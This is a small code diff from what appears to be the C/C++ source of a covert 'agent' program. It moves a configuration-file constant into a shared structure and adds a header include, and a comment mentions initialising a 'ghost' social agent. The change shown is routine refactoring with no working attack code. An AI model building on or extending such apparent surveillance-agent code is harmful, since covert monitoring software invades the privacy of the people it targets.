@@ -4,6 +4,7 @@
 #include "AM_Core.h"
 #include "LOG.h"
 #include <json/json.h>
+#include "bss.h"
 
 // XXX Definita in HM_IpcModule!!!!
 #define MAX_MSG_LEN 512 // Lunghezza di un messaggio
@@ -478,7 +479,7 @@ void WINAPI ParseModules(JSONObject module, DWORD dummy)
 void UpdateAgentConf()
 {
 	JSONObject dummy;
-	char *conf_json = HM_ReadClearConf(H4_CONF_FILE);
+	char *conf_json = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_json) {
 		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
 		// Inizializza l'agente "fantasma" social
